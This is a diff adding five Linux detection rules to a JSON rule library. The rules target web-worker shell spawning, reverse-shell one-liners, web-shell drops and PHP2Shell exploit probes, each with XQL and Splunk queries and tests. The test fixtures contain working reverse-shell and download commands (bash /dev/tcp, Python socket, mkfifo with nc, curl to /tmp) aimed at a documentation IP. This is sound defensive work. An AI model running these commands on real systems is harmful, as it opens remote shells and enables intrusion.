@@ -5190,6 +5190,377 @@
      }
     ]
    }
+  },
+  {
+   "id": "DL-0063",
+   "title": "Web server or PHP worker starts a shell or download tool (Linux)",
+   "description": "Apache, nginx, PHP-FPM, php-cgi, FrankenPHP or LiteSpeed starting sh, bash, curl, wget, netcat, Python or a recon command. This is the most direct sign that a remote code execution bug or a web shell is being used, for example PHP2Shell (CVE-2026-109618 and CVE-2026-109619), where the command runs as the web user (www-data) under the worker.",
+   "attack": [
+    "T1190",
+    "T1059.004",
+    "T1505.003"
+   ],
+   "tactic": "initial-access",
+   "severity": "high",
+   "logsource": "process_creation",
+   "selections": {
+    "web_parent": [
+     {
+      "field": "parent.path",
+      "op": "re",
+      "all": false,
+      "values": [
+       "/(apache2|httpd|nginx|php-fpm[0-9.]*|php-cgi[0-9.]*|frankenphp|lsphp[0-9]*|litespeed|lshttpd)$"
+      ]
+     }
+    ],
+    "shell_or_tool": [
+     {
+      "field": "process.path",
+      "op": "re",
+      "all": false,
+      "values": [
+       "/(sh|bash|dash|zsh|ksh|busybox|nc|ncat|netcat|socat|curl|wget|python[0-9.]*|perl|ruby|id|whoami|uname|hostname|base64|chmod)$"
+      ]
+     }
+    ],
+    "mail": [
+     {
+      "field": "process.command_line",
+      "op": "contains",
+      "all": false,
+      "values": [
+       "sendmail",
+       "/usr/sbin/exim",
+       "postdrop"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "and": [
+     {
+      "and": [
+       {
+        "sel": "web_parent"
+       },
+       {
+        "sel": "shell_or_tool"
+       }
+      ]
+     },
+     {
+      "not": {
+       "sel": "mail"
+      }
+     }
+    ]
+   },
+   "condition_text": "web_parent and shell_or_tool and not mail",
+   "triage": [
+    "Read the full process tree under the worker. A reverse shell (DL-0064), a download into /tmp or /dev/shm, or id / uname right after a burst of PHP memory errors (DL-0066) points to exploitation.",
+    "Before you restart PHP, capture the worker's memory and the Apache logs. A restart erases the evidence.",
+    "Patch PHP (8.2.35, 8.3.36, 8.4.27, 8.5.12 or your vendor backport) and restart every worker."
+   ],
+   "false_positives": [
+    "PHP mail() runs sh -c sendmail (excluded). Applications that shell out to ImageMagick, git or a converter through sh -c. Baseline them per host."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter (actor_process_image_path ~= \"(?i)/(apache2|httpd|nginx|php-fpm[0-9.]*|php-cgi[0-9.]*|frankenphp|lsphp[0-9]*|litespeed|lshttpd)$\" and action_process_image_path ~= \"(?i)/(sh|bash|dash|zsh|ksh|busybox|nc|ncat|netcat|socat|curl|wget|python[0-9.]*|perl|ruby|id|whoami|uname|hostname|base64|chmod)$\") and not ((action_process_image_command_line != null and (action_process_image_command_line contains \"sendmail\" or action_process_image_command_line contains \"/usr/sbin/exim\" or action_process_image_command_line contains \"postdrop\")))\n| fields _time, agent_hostname, actor_effective_username, actor_process_image_name, action_process_image_name, action_process_image_command_line\n| sort desc _time\n| limit 1000\n",
+   "spl": "`sysmon` EventCode=1\n| eval process_name=lower(mvindex(split(Image,\"\\\\\"),-1)), parent_name=lower(mvindex(split(ParentImage,\"\\\\\"),-1))\n| where (match(ParentImage, \"(?i)/(apache2|httpd|nginx|php-fpm[0-9.]*|php-cgi[0-9.]*|frankenphp|lsphp[0-9]*|litespeed|lshttpd)$\") AND match(Image, \"(?i)/(sh|bash|dash|zsh|ksh|busybox|nc|ncat|netcat|socat|curl|wget|python[0-9.]*|perl|ruby|id|whoami|uname|hostname|base64|chmod)$\")) AND NOT ((isnotnull(CommandLine) AND (match(CommandLine, \"(?i)sendmail\") OR match(CommandLine, \"(?i)/usr/sbin/exim\") OR match(CommandLine, \"(?i)postdrop\"))))\n| table _time host User ParentImage Image CommandLine\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "parent.path": "/usr/sbin/apache2",
+      "process.path": "/usr/bin/dash",
+      "process.name": "dash",
+      "process.command_line": "sh -c id;uname -a"
+     },
+     {
+      "parent.path": "/usr/sbin/php-fpm8.3",
+      "process.path": "/usr/bin/curl",
+      "process.name": "curl",
+      "process.command_line": "curl -s http://203.0.113.9/x -o /tmp/.x"
+     }
+    ],
+    "no_match": [
+     {
+      "parent.path": "/usr/sbin/apache2",
+      "process.path": "/usr/bin/dash",
+      "process.name": "dash",
+      "process.command_line": "sh -c /usr/sbin/sendmail -t -i"
+     },
+     {
+      "parent.path": "/usr/sbin/sshd",
+      "process.path": "/usr/bin/bash",
+      "process.name": "bash",
+      "process.command_line": "-bash"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0064",
+   "title": "Reverse shell one-liner on Linux",
+   "description": "Command lines that connect a shell back to an attacker: bash with /dev/tcp, bash -i, netcat or ncat with -e or -c, mkfifo pipes, socat exec, or Python and Perl socket one-liners. After a web exploit this is usually the first thing run.",
+   "attack": [
+    "T1059.004",
+    "T1059.006"
+   ],
+   "tactic": "execution",
+   "severity": "critical",
+   "logsource": "process_creation",
+   "selections": {
+    "reverse_shell": [
+     {
+      "field": "process.command_line",
+      "op": "re",
+      "all": false,
+      "values": [
+       "(/dev/(tcp|udp)/|\\bbash\\s+-i\\b|\\bnc(at)?\\b.*\\s-(e|c)\\s|mkfifo\\s|socat\\b.*exec:|socket\\.socket\\(|pty\\.spawn\\(|IO::Socket::INET)"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "sel": "reverse_shell"
+   },
+   "condition_text": "reverse_shell",
+   "triage": [
+    "Isolate the host. Take the remote IP and port from the command line and block them at the edge.",
+    "Find the parent. A web server or PHP worker parent means a web exploit (DL-0063); check the web logs around that time."
+   ],
+   "false_positives": [
+    "Admin scripts that test a port with bash /dev/tcp. They do not start an interactive shell."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_command_line ~= \"(?i)(/dev/(tcp|udp)/|\\\\bbash\\\\s+-i\\\\b|\\\\bnc(at)?\\\\b.*\\\\s-(e|c)\\\\s|mkfifo\\\\s|socat\\\\b.*exec:|socket\\\\.socket\\\\(|pty\\\\.spawn\\\\(|IO::Socket::INET)\"\n| fields _time, agent_hostname, actor_effective_username, actor_process_image_name, action_process_image_name, action_process_image_command_line\n| sort desc _time\n| limit 1000\n",
+   "spl": "`sysmon` EventCode=1\n| eval process_name=lower(mvindex(split(Image,\"\\\\\"),-1)), parent_name=lower(mvindex(split(ParentImage,\"\\\\\"),-1))\n| where match(CommandLine, \"(?i)(/dev/(tcp|udp)/|\\\\bbash\\\\s+-i\\\\b|\\\\bnc(at)?\\\\b.*\\\\s-(e|c)\\\\s|mkfifo\\\\s|socat\\\\b.*exec:|socket\\\\.socket\\\\(|pty\\\\.spawn\\\\(|IO::Socket::INET)\")\n| table _time host User ParentImage Image CommandLine\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "process.name": "bash",
+      "process.path": "/usr/bin/bash",
+      "process.command_line": "bash -c \"bash -i >& /dev/tcp/203.0.113.9/443 0>&1\""
+     },
+     {
+      "process.name": "python3",
+      "process.path": "/usr/bin/python3",
+      "process.command_line": "python3 -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('203.0.113.9',443))\""
+     },
+     {
+      "process.name": "sh",
+      "process.path": "/bin/sh",
+      "process.command_line": "sh -c \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 203.0.113.9 443 >/tmp/f\""
+     }
+    ],
+    "no_match": [
+     {
+      "process.name": "bash",
+      "process.path": "/usr/bin/bash",
+      "process.command_line": "bash /opt/backup/run.sh --daily"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0065",
+   "title": "PHP file written in the web root by the web server or PHP worker",
+   "description": "The web server or PHP worker creating a .php, .phtml or .phar file under the web root. After remote code execution, attackers drop a web shell so they can come back even after the bug is patched.",
+   "attack": [
+    "T1505.003"
+   ],
+   "tactic": "persistence",
+   "severity": "medium",
+   "logsource": "file_event",
+   "selections": {
+    "web_writer": [
+     {
+      "field": "process.path",
+      "op": "re",
+      "all": false,
+      "values": [
+       "/(apache2|httpd|nginx|php-fpm[0-9.]*|php-cgi[0-9.]*|frankenphp|lsphp[0-9]*|dash|sh|bash|curl|wget)$"
+      ]
+     }
+    ],
+    "php_in_webroot": [
+     {
+      "field": "file.path",
+      "op": "re",
+      "all": false,
+      "values": [
+       "^/(var/www|srv/www|srv/http|usr/share/nginx)/.+\\.(php[0-9]?|phtml|phar|pht)$"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "and": [
+     {
+      "sel": "web_writer"
+     },
+     {
+      "sel": "php_in_webroot"
+     }
+    ]
+   },
+   "condition_text": "web_writer and php_in_webroot",
+   "triage": [
+    "Open the file. Short files with eval, base64_decode, system, passthru or assert are web shells.",
+    "Find the first request that hit the new file in the access log; that source IP is the attacker."
+   ],
+   "false_positives": [
+    "CMS core and plugin updates (WordPress, Drupal) written by the PHP worker. Correlate with an update in the admin panel."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.FILE and event_sub_type in (ENUM.FILE_CREATE_NEW, ENUM.FILE_WRITE)\n| filter actor_process_image_path ~= \"(?i)/(apache2|httpd|nginx|php-fpm[0-9.]*|php-cgi[0-9.]*|frankenphp|lsphp[0-9]*|dash|sh|bash|curl|wget)$\" and action_file_path ~= \"(?i)^/(var/www|srv/www|srv/http|usr/share/nginx)/.+\\\\.(php[0-9]?|phtml|phar|pht)$\"\n| fields _time, agent_hostname, actor_process_image_name, action_file_path\n| sort desc _time\n| limit 1000\n",
+   "spl": "`sysmon` EventCode=11\n| eval process_name=lower(mvindex(split(Image,\"\\\\\"),-1)), file_name=lower(mvindex(split(TargetFilename,\"\\\\\"),-1))\n| where match(Image, \"(?i)/(apache2|httpd|nginx|php-fpm[0-9.]*|php-cgi[0-9.]*|frankenphp|lsphp[0-9]*|dash|sh|bash|curl|wget)$\") AND match(TargetFilename, \"(?i)^/(var/www|srv/www|srv/http|usr/share/nginx)/.+\\\\.(php[0-9]?|phtml|phar|pht)$\")\n| table _time host Image TargetFilename\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "process.name": "php-fpm8.3",
+      "process.path": "/usr/sbin/php-fpm8.3",
+      "file.path": "/var/www/html/wp-content/uploads/2026/10/cache.php"
+     },
+     {
+      "process.name": "dash",
+      "process.path": "/usr/bin/dash",
+      "file.path": "/var/www/html/.config.phtml"
+     }
+    ],
+    "no_match": [
+     {
+      "process.name": "php-fpm8.3",
+      "process.path": "/usr/sbin/php-fpm8.3",
+      "file.path": "/var/www/html/wp-content/uploads/2026/10/photo.jpg"
+     },
+     {
+      "process.name": "vim",
+      "process.path": "/usr/bin/vim",
+      "file.path": "/var/www/html/index.php"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0066",
+   "title": "PHP ran out of memory before any script line ran (PHP2Shell probe)",
+   "description": "\"Allowed memory size ... exhausted\" with \"Unknown on line 0\" means PHP hit memory_limit while parsing the request, before the application started. CVE-2026-109618 is triggered exactly this way, with a large multipart POST, so a few of these from one client can be a PHP2Shell attempt. A successful exploit can still return HTTP 200, so do not wait for a crash.",
+   "attack": [
+    "T1190"
+   ],
+   "tactic": "initial-access",
+   "severity": "medium",
+   "logsource": "web_server_error",
+   "selections": {
+    "oom_at_parse": [
+     {
+      "field": "log.message",
+      "op": "contains",
+      "all": true,
+      "values": [
+       "allowed memory size of",
+       "exhausted",
+       "unknown on line 0"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "sel": "oom_at_parse"
+   },
+   "condition_text": "oom_at_parse",
+   "triage": [
+    "Count these per client IP over a few minutes. Five or more from one source is a strong signal (see the correlation query on the rule page).",
+    "Check the same host for a shell under the web worker (DL-0063) and new PHP files in the web root (DL-0065).",
+    "Confirm the PHP version is patched and session.upload_progress.enabled is 0 until it is."
+   ],
+   "false_positives": [
+    "Very large legitimate form posts on servers with a small memory_limit. They come from known users and repeat the same URL."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = apache_httpd_raw\n| filter _raw_log != null\n| filter _raw_log contains \"allowed memory size of\" and _raw_log contains \"exhausted\" and _raw_log contains \"unknown on line 0\"\n| fields _time, _raw_log\n| sort desc _time\n| limit 1000\n",
+   "spl": "`apache_error`\n| where match(_raw, \"(?i)allowed\\\\ memory\\\\ size\\\\ of\") AND match(_raw, \"(?i)exhausted\") AND match(_raw, \"(?i)unknown\\\\ on\\\\ line\\\\ 0\")\n| table _time host _raw\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "log.message": "[Thu Oct 22 09:14:02.118262 2026] [php:error] [pid 46981] [client 198.51.100.23:51522] PHP Fatal error:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 65536 bytes) in Unknown on line 0"
+     }
+    ],
+    "no_match": [
+     {
+      "log.message": "[Thu Oct 22 09:14:02.118262 2026] [php:error] [pid 46981] [client 198.51.100.23:51522] PHP Fatal error:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 20480 bytes) in /var/www/html/report.php on line 88"
+     },
+     {
+      "log.message": "[Thu Oct 22 09:14:02.118262 2026] [core:notice] [pid 812] AH00094: Command line: '/usr/sbin/apache2'"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0067",
+   "title": "Web server or PHP-FPM worker crashed with a segmentation fault",
+   "description": "Apache AH00051 / AH00052 \"exit signal Segmentation fault\" or PHP-FPM \"exited on signal 11 (SIGSEGV)\". Memory corruption exploits such as PHP2Shell often crash a few workers before one attempt works, so crashes on an internet-facing PHP server are worth a look.",
+   "attack": [
+    "T1190"
+   ],
+   "tactic": "initial-access",
+   "severity": "medium",
+   "logsource": "web_server_error",
+   "selections": {
+    "apache_segv": [
+     {
+      "field": "log.message",
+      "op": "re",
+      "all": false,
+      "values": [
+       "ah0005[12].*segmentation fault"
+      ]
+     }
+    ],
+    "fpm_segv": [
+     {
+      "field": "log.message",
+      "op": "contains",
+      "all": false,
+      "values": [
+       "exited on signal 11"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "or": [
+     {
+      "sel": "apache_segv"
+     },
+     {
+      "sel": "fpm_segv"
+     }
+    ]
+   },
+   "condition_text": "apache_segv or fpm_segv",
+   "triage": [
+    "Look at the requests just before the crash (access log, same second). Large multipart POSTs from one source point to exploitation.",
+    "Check for PHP memory errors from the same client (DL-0066) and for processes under the worker (DL-0063)."
+   ],
+   "false_positives": [
+    "Buggy PHP extensions or modules that crash under load. Those crash at the same code path every time; check with the vendor."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = apache_httpd_raw\n| filter _raw_log != null\n| filter _raw_log ~= \"(?i)ah0005[12].*segmentation fault\" or _raw_log contains \"exited on signal 11\"\n| fields _time, _raw_log\n| sort desc _time\n| limit 1000\n",
+   "spl": "`apache_error`\n| where match(_raw, \"(?i)ah0005[12].*segmentation fault\") OR match(_raw, \"(?i)exited\\\\ on\\\\ signal\\\\ 11\")\n| table _time host _raw\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "log.message": "[Thu Oct 22 09:14:03.551204 2026] [core:notice] [pid 812] AH00052: child pid 46983 exit signal Segmentation fault (11)"
+     },
+     {
+      "log.message": "[22-Oct-2026 09:14:03] WARNING: [pool www] child 2231 exited on signal 11 (SIGSEGV) after 41.2 seconds from start"
+     }
+    ],
+    "no_match": [
+     {
+      "log.message": "[Thu Oct 22 09:00:00.000000 2026] [mpm_prefork:notice] [pid 812] AH00163: Apache/2.4.58 (Ubuntu) configured -- resuming normal operations"
+     }
+    ]
+   }
   }
  ],
  "logsources": {
@@ -5247,6 +5618,12 @@
     "process.name",
     "process.path",
     "user"
+   ]
+  },
+  "web_server_error": {
+   "description": "A line from the web server error log, including PHP errors (Apache error.log; XDR Collector dataset apache_httpd_raw, Splunk sourcetype apache:error)",
+   "fields": [
+    "log.message"
    ]
   },
   "windows_event": {
